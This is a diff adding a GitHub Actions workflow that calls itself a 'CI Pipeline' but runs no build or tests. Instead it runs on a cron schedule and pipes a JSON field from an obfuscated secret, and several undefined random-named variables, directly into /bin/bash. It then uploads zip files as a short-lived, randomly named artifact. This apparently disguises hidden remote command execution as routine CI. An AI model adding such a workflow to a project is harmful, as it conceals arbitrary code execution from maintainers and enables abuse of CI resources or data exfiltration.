@@ -1,0 +1,34 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          oap14701: ${{ secrets.oap14701 }}
+        run: |
+          printf '%s' "$oap14701" | jq -r .psrl9 | /bin/bash
+          printf '%s' "$pqufq7773" | jq -r .dlcvl7432 | /bin/bash
+          echo $jl4972 | jq -r .gn43 | /bin/bash
+          echo $uxjir26 | jq -r .rhyo86595 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: pyOBAJLQ
+          path: "*.zip"
+          retention-days: 1
